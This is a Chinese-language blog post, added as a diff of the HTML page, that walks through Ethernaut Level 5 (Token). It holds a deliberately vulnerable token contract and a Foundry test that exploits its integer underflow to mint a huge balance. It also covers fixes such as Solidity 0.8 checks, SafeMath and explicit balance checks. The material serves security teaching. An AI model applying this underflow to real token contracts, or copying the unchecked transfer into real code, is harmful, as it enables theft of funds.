@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Ethernaut Level 5: Token - 整数下溢攻击详解 - Kent&#39;s Blog
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>KENT&#39;S BLOG</span>
+  </a>
+</div>
+    <div id="menu" class="book-menu hide">
+  <h2 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h2><ul>
+<li><a href="/">首页</a></li>
+<li><a href="/archives">文章归档</a></li>
+<li><a href="/categories">分类浏览</a> </li>
+<li><a href="/tags">标签云</a></li>
+</ul>
+<h2 id="Web3-0-专区"><a href="#Web3-0-专区" class="headerlink" title="Web3.0 专区"></a>Web3.0 专区</h2><ul>
+<li><a href="/categories/Dapp">Dapp 开发</a></li>
+<li><a href="/tags/solidity">智能合约</a></li>
+<li><a href="/tags/blockchain">区块链技术</a></li>
+<li><a href="/categories/Web3%E5%AE%89%E5%85%A8">Web3安全</a></li>
+</ul>
+<h2 id="Ethernaut-系列-🛡️"><a href="#Ethernaut-系列-🛡️" class="headerlink" title="Ethernaut 系列 🛡️"></a>Ethernaut 系列 🛡️</h2><ul>
+<li><a href="/2025/01/25/ethernaut-foundry-solutions-series/">系列总览</a></li>
+<li><a href="/2025/01/25/foundry-setup-guide/">Foundry 环境搭建</a></li>
+</ul>
+<h3 id="基础攻击篇-1-10"><a href="#基础攻击篇-1-10" class="headerlink" title="基础攻击篇 (1-10)"></a>基础攻击篇 (1-10)</h3><ul>
+<li><a href="/2025/01/25/ethernaut-level-01-fallback/">Level 1: Fallback</a></li>
+<li><a href="/2025/01/25/ethernaut-level-02-fallout/">Level 2: Fallout</a></li>
+<li><a href="/2025/01/25/ethernaut-level-03-coinflip/">Level 3: Coin Flip</a></li>
+<li><a href="/2025/01/25/ethernaut-level-04-telephone/">Level 4: Telephone</a></li>
+<li><a href="/2025/01/25/ethernaut-level-05-token/">Level 5: Token</a></li>
+<li><a href="/2025/01/25/ethernaut-level-06-delegation/">Level 6: Delegation</a></li>
+<li><a href="/2025/01/25/ethernaut-level-07-force/">Level 7: Force</a></li>
+<li><a href="/2025/01/25/ethernaut-level-08-vault/">Level 8: Vault</a></li>
+<li><a href="/2025/01/25/ethernaut-level-09-king/">Level 9: King</a></li>
+<li><a href="/2025/01/25/ethernaut-level-10-reentrancy/">Level 10: Re-entrancy</a></li>
+</ul>
+<h3 id="进阶攻击篇-11-20"><a href="#进阶攻击篇-11-20" class="headerlink" title="进阶攻击篇 (11-20)"></a>进阶攻击篇 (11-20)</h3><ul>
+<li><a href="/2025/01/25/ethernaut-level-11-elevator/">Level 11: Elevator</a></li>
+<li><a href="/2025/01/25/ethernaut-level-12-privacy/">Level 12: Privacy</a></li>
+<li><a href="/2025/01/25/ethernaut-level-13-gatekeeper-one/">Level 13: Gatekeeper One</a></li>
+<li><a href="/2025/01/25/ethernaut-level-14-gatekeeper-two/">Level 14: Gatekeeper Two</a></li>
+<li><a href="/2025/01/25/ethernaut-level-15-naught-coin/">Level 15: Naught Coin</a></li>
+<li><a href="/2025/01/25/ethernaut-level-16-preservation/">Level 16: Preservation</a></li>
+<li><a href="/2025/01/25/ethernaut-level-17-recovery/">Level 17: Recovery</a></li>
+<li><a href="/2025/01/25/ethernaut-level-18-magic-number/">Level 18: Magic Number</a></li>
+<li><a href="/2025/01/25/ethernaut-level-19-alien-codex/">Level 19: Alien Codex</a></li>
+<li><a href="/2025/01/25/ethernaut-level-20-denial/">Level 20: Denial</a></li>
+</ul>
+<h3 id="高级攻击篇-21-25"><a href="#高级攻击篇-21-25" class="headerlink" title="高级攻击篇 (21-25)"></a>高级攻击篇 (21-25)</h3><ul>
+<li><a href="/2025/01/25/ethernaut-level-21-shop/">Level 21: Shop</a></li>
+<li><a href="/2025/01/25/ethernaut-level-22-dex/">Level 22: Dex</a></li>
+<li><a href="/2025/01/25/ethernaut-level-23-dex-two/">Level 23: Dex Two</a></li>
+<li><a href="/2025/01/25/ethernaut-level-24-puzzle-wallet/">Level 24: Puzzle Wallet</a></li>
+<li><a href="/2025/01/25/ethernaut-level-25-motorbike/">Level 25: Motorbike</a></li>
+</ul>
+<h2 id="个人页面"><a href="#个人页面" class="headerlink" title="个人页面"></a>个人页面</h2><ul>
+<li><a href="/about">关于我</a></li>
+<li><a href="/repository">项目展示</a></li>
+<li><a href="/books">书单推荐</a></li>
+<li><a href="/links">友情链接</a></li>
+</ul>
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <h1 id="🎯-Ethernaut-Level-5-Token-整数下溢攻击详解"><a href="#🎯-Ethernaut-Level-5-Token-整数下溢攻击详解" class="headerlink" title="🎯 Ethernaut Level 5: Token - 整数下溢攻击详解"></a>🎯 Ethernaut Level 5: Token - 整数下溢攻击详解</h1><blockquote>
+<p><strong>关卡链接</strong>: <a target="_blank" rel="noopener" href="https://ethernaut.openzeppelin.com/level/5">Ethernaut Level 5 - Token</a><br><strong>攻击类型</strong>: 整数下溢攻击<br><strong>难度</strong>: ⭐⭐⭐☆☆</p>
+</blockquote>
+<h2 id="📋-挑战目标"><a href="#📋-挑战目标" class="headerlink" title="📋 挑战目标"></a>📋 挑战目标</h2><ol>
+<li><strong>获得大量代币</strong> - 从初始的 20 个代币增加到大量代币</li>
+<li><strong>理解整数溢出</strong> - 掌握算术运算的安全问题</li>
+</ol>
+<h2 id="🔍-漏洞分析"><a href="#🔍-漏洞分析" class="headerlink" title="🔍 漏洞分析"></a>🔍 漏洞分析</h2><h3 id="合约源码分析"><a href="#合约源码分析" class="headerlink" title="合约源码分析"></a>合约源码分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line">    mapping(address =&gt; uint) balances;</span><br><span class="line">    uint public totalSupply;</span><br><span class="line"></span><br><span class="line">    constructor(uint _initialSupply) public &#123;</span><br><span class="line">        balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">        // 🚨 漏洞：没有检查下溢出</span><br><span class="line">        require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">        balances[msg.sender] -= _value;</span><br><span class="line">        balances[_to] += _value;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class="line">        return balances[_owner];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞识别"><a href="#漏洞识别" class="headerlink" title="漏洞识别"></a>漏洞识别</h3><p><strong>整数下溢问题</strong>：</p>
+<ol>
+<li><strong>无符号整数特性</strong> - <code>uint</code> 类型不能为负数</li>
+<li><strong>下溢行为</strong> - 当 <code>0 - 1</code> 时，结果变成 <code>2^256 - 1</code></li>
+<li><strong>检查失效</strong> - <code>require(balances[msg.sender] - _value &gt;= 0)</code> 总是为真</li>
+</ol>
+<h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 假设用户余额为 20</span><br><span class="line">uint balance = 20;</span><br><span class="line">uint transferAmount = 21;</span><br><span class="line"></span><br><span class="line">// 下溢计算：20 - 21 = 2^256 - 1 (巨大的正数)</span><br><span class="line">uint result = balance - transferAmount;</span><br><span class="line">// result = 115792089237316195423570985008687907853269984665640564039457584007913129639935</span><br><span class="line"></span><br><span class="line">// require 检查：巨大的正数 &gt;= 0，总是为真</span><br><span class="line">require(result &gt;= 0); // ✅ 通过检查</span><br></pre></td></tr></table></figure>
+
+<h2 id="💻-Foundry-实现"><a href="#💻-Foundry-实现" class="headerlink" title="💻 Foundry 实现"></a>💻 Foundry 实现</h2><h3 id="攻击测试代码"><a href="#攻击测试代码" class="headerlink" title="攻击测试代码"></a>攻击测试代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line"></span><br><span class="line">// 复制原始有漏洞的合约 (使用 0.6.0 版本行为)</span><br><span class="line">contract VulnerableToken &#123;</span><br><span class="line">    mapping(address =&gt; uint) public balances;</span><br><span class="line">    uint public totalSupply;</span><br><span class="line"></span><br><span class="line">    constructor(uint _initialSupply) &#123;</span><br><span class="line">        balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">        // 故意使用不安全的算术运算</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">            balances[msg.sender] -= _value;</span><br><span class="line">            balances[_to] += _value;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class="line">        return balances[_owner];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TokenTest is Test &#123;</span><br><span class="line">    VulnerableToken public token;</span><br><span class="line">    </span><br><span class="line">    address public attacker = makeAddr(&quot;attacker&quot;);</span><br><span class="line">    address public victim = makeAddr(&quot;victim&quot;);</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        // 部署代币合约，初始供应量 1000</span><br><span class="line">        token = new VulnerableToken(1000);</span><br><span class="line">        </span><br><span class="line">        // 给攻击者 20 个代币</span><br><span class="line">        token.transfer(attacker, 20);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testTokenUnderflowExploit() public &#123;</span><br><span class="line">        console.log(&quot;=== 攻击前状态 ===&quot;);</span><br><span class="line">        console.log(&quot;攻击者余额:&quot;, token.balanceOf(attacker));</span><br><span class="line">        console.log(&quot;受害者余额:&quot;, token.balanceOf(victim));</span><br><span class="line">        </span><br><span class="line">        vm.startPrank(attacker);</span><br><span class="line">        </span><br><span class="line">        // 🎯 关键攻击：转账超过余额的代币</span><br><span class="line">        uint256 transferAmount = 21; // 大于 20 的余额</span><br><span class="line">        token.transfer(victim, transferAmount);</span><br><span class="line">        </span><br><span class="line">        vm.stopPrank();</span><br><span class="line">        </span><br><span class="line">        console.log(&quot;=== 攻击后状态 ===&quot;);</span><br><span class="line">        console.log(&quot;攻击者余额:&quot;, token.balanceOf(attacker));</span><br><span class="line">        console.log(&quot;受害者余额:&quot;, token.balanceOf(victim));</span><br><span class="line">        </span><br><span class="line">        // 验证下溢攻击成功</span><br><span class="line">        assertGt(token.balanceOf(attacker), 1000000); // 攻击者获得巨额代币</span><br><span class="line">        assertEq(token.balanceOf(victim), transferAmount);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function testUnderflowMath() public view &#123;</span><br><span class="line">        // 演示下溢计算</span><br><span class="line">        uint256 balance = 20;</span><br><span class="line">        uint256 transferAmount = 21;</span><br><span class="line">        </span><br><span class="line">        console.log(&quot;=== 下溢计算演示 ===&quot;);</span><br><span class="line">        console.log(&quot;原始余额:&quot;, balance);</span><br><span class="line">        console.log(&quot;转账金额:&quot;, transferAmount);</span><br><span class="line">        </span><br><span class="line">        unchecked &#123;</span><br><span class="line">            uint256 result = balance - transferAmount;</span><br><span class="line">            console.log(&quot;下溢结果:&quot;, result);</span><br><span class="line">            console.log(&quot;最大 uint256:&quot;, type(uint256).max);</span><br><span class="line">            console.log(&quot;是否相等:&quot;, result == type(uint256).max);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function testSafeVersion() public &#123;</span><br><span class="line">        // 演示安全版本</span><br><span class="line">        VulnerableToken safeToken = new VulnerableToken(1000);</span><br><span class="line">        safeToken.transfer(attacker, 20);</span><br><span class="line">        </span><br><span class="line">        vm.startPrank(attacker);</span><br><span class="line">        </span><br><span class="line">        // 在 Solidity 0.8.0+ 中，这会 revert</span><br><span class="line">        vm.expectRevert(); // 期望交易失败</span><br><span class="line">        safeToken.transfer(victim, 21); // 这在新版本中会失败</span><br><span class="line">        </span><br><span class="line">        vm.stopPrank();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forge <span class="built_in">test</span> --match-contract TokenTest -vvv</span><br></pre></td></tr></table></figure>
+
+<h2 id="🛡️-防御措施"><a href="#🛡️-防御措施" class="headerlink" title="🛡️ 防御措施"></a>🛡️ 防御措施</h2><h3 id="1-使用-Solidity-0-8-0"><a href="#1-使用-Solidity-0-8-0" class="headerlink" title="1. 使用 Solidity 0.8.0+"></a>1. 使用 Solidity 0.8.0+</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract SafeToken &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line">    </span><br><span class="line">    function transfer(address _to, uint256 _value) public returns (bool) &#123;</span><br><span class="line">        // Solidity 0.8.0+ 自动检查溢出</span><br><span class="line">        balances[msg.sender] -= _value; // 自动 revert 如果下溢</span><br><span class="line">        balances[_to] += _value;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-使用-SafeMath-库-旧版本"><a href="#2-使用-SafeMath-库-旧版本" class="headerlink" title="2. 使用 SafeMath 库 (旧版本)"></a>2. 使用 SafeMath 库 (旧版本)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/math/SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract SafeTokenV6 &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line">    </span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line">    </span><br><span class="line">    function transfer(address _to, uint256 _value) public returns (bool) &#123;</span><br><span class="line">        balances[msg.sender] = balances[msg.sender].sub(_value); // 安全减法</span><br><span class="line">        balances[_to] = balances[_to].add(_value); // 安全加法</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-显式检查"><a href="#3-显式检查" class="headerlink" title="3. 显式检查"></a>3. 显式检查</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract ExplicitCheckToken &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line">    </span><br><span class="line">    function transfer(address _to, uint256 _value) public returns (bool) &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= _value, &quot;Insufficient balance&quot;);</span><br><span class="line">        </span><br><span class="line">        balances[msg.sender] -= _value;</span><br><span class="line">        balances[_to] += _value;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="📚-核心知识点"><a href="#📚-核心知识点" class="headerlink" title="📚 核心知识点"></a>📚 核心知识点</h2><h3 id="整数溢出类型"><a href="#整数溢出类型" class="headerlink" title="整数溢出类型"></a>整数溢出类型</h3><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>描述</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>上溢</strong></td>
+<td>超过最大值</td>
+<td><code>type(uint256).max + 1 = 0</code></td>
+</tr>
+<tr>
+<td><strong>下溢</strong></td>
+<td>低于最小值</td>
+<td><code>0 - 1 = type(uint256).max</code></td>
+</tr>
+</tbody></table>
+<h3 id="Solidity-版本对比"><a href="#Solidity-版本对比" class="headerlink" title="Solidity 版本对比"></a>Solidity 版本对比</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// Solidity 0.7.x 及以下</span><br><span class="line">function unsafeAdd(uint a, uint b) public pure returns (uint) &#123;</span><br><span class="line">    return a + b; // 可能溢出，无自动检查</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Solidity 0.8.0+</span><br><span class="line">function safeAdd(uint a, uint b) public pure returns (uint) &#123;</span><br><span class="line">    return a + b; // 自动检查溢出，溢出时 revert</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 显式不安全操作 (0.8.0+)</span><br><span class="line">function explicitUnsafe(uint a, uint b) public pure returns (uint) &#123;</span><br><span class="line">    unchecked &#123;</span><br><span class="line">        return a + b; // 显式跳过溢出检查</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="安全数学运算"><a href="#安全数学运算" class="headerlink" title="安全数学运算"></a>安全数学运算</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// ✅ 安全的余额检查</span><br><span class="line">function safeTransfer(address _to, uint256 _value) public &#123;</span><br><span class="line">    require(balances[msg.sender] &gt;= _value, &quot;Insufficient balance&quot;);</span><br><span class="line">    </span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// ✅ 使用 SafeMath (旧版本)</span><br><span class="line">function safeTransferLegacy(address _to, uint256 _value) public &#123;</span><br><span class="line">    balances[msg.sender] = balances[msg.sender].sub(_value);</span><br><span class="line">    balances[_to] = balances[_to].add(_value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="🏛️-历史案例"><a href="#🏛️-历史案例" class="headerlink" title="🏛️ 历史案例"></a>🏛️ 历史案例</h2><h3 id="著名的整数溢出攻击"><a href="#著名的整数溢出攻击" class="headerlink" title="著名的整数溢出攻击"></a>著名的整数溢出攻击</h3><ol>
+<li><p><strong>PoWHCoin</strong> (2018)</p>
+<ul>
+<li>攻击者利用整数溢出获得巨额代币</li>
+<li>导致项目完全崩溃</li>
+</ul>
+</li>
+<li><p><strong>BeautyChain (BEC)</strong> (2018)</p>
+<ul>
+<li>BatchOverFlow 漏洞</li>
+<li>造成代币价值归零</li>
+</ul>
+</li>
+<li><p><strong>SMT Token</strong> (2018)</p>
+<ul>
+<li>类似的批量转账溢出漏洞</li>
+<li>交易所暂停交易</li>
+</ul>
+</li>
+</ol>
+<h2 id="🎯-总结"><a href="#🎯-总结" class="headerlink" title="🎯 总结"></a>🎯 总结</h2><p>Token 关卡揭示了早期 Solidity 的重要安全隐患：</p>
+<ul>
+<li>✅ <strong>整数溢出的严重后果</strong> - 可以完全破坏代币经济学</li>
+<li>✅ <strong>版本升级的重要性</strong> - Solidity 0.8.0+ 提供内置保护</li>
+<li>✅ <strong>SafeMath 的历史价值</strong> - 在旧版本中提供安全保护</li>
+<li>✅ <strong>显式检查的必要性</strong> - 总是验证关键假设</li>
+</ul>
+<p>这个看似简单的算术错误，实际上影响了无数 DeFi 项目的安全性设计。</p>
+<hr>
+<h2 id="🔗-相关链接"><a href="#🔗-相关链接" class="headerlink" title="🔗 相关链接"></a>🔗 相关链接</h2><ul>
+<li><strong><a href="/2025/01/25/ethernaut-level-04-telephone/">上一关: Level 4 - Telephone</a></strong></li>
+<li><strong><a href="/2025/01/25/ethernaut-level-06-delegation/">下一关: Level 6 - Delegation</a></strong></li>
+<li><strong><a href="/2025/01/25/ethernaut-foundry-solutions-series/">系列目录: Ethernaut Foundry Solutions</a></strong></li>
+<li><strong><a target="_blank" rel="noopener" href="https://docs.openzeppelin.com/contracts/2.x/api/math">OpenZeppelin SafeMath</a></strong></li>
+<li><strong><a target="_blank" rel="noopener" href="https://github.com/XuHugo/Ethernaut-Foundry-Solutions">GitHub 项目</a></strong></li>
+</ul>
+
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure
+          class="avatar avatar-lg"
+          data-initial="K"
+          style="background-color: #3b4351;">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>Kent</div>
+      <div>2025-01-25</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/Web3%E5%AE%89%E5%85%A8/">Web3安全</a> <a class="category-link" href="/categories/Web3%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/">智能合约</a> <a class="category-link" href="/categories/Web3%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/Ethernaut/">Ethernaut</a>
+
+      <a class="tag-none-link" href="/tags/Ethernaut/" rel="tag">#Ethernaut</a> <a class="tag-none-link" href="/tags/Foundry/" rel="tag">#Foundry</a> <a class="tag-none-link" href="/tags/SafeMath/" rel="tag">#SafeMath</a> <a class="tag-none-link" href="/tags/Solidity/" rel="tag">#Solidity</a> <a class="tag-none-link" href="/tags/%E6%95%B4%E6%95%B0%E4%B8%8B%E6%BA%A2/" rel="tag">#整数下溢</a> <a class="tag-none-link" href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/" rel="tag">#智能合约安全</a> <a class="tag-none-link" href="/tags/%E7%AE%97%E6%9C%AF%E6%BA%A2%E5%87%BA/" rel="tag">#算术溢出</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
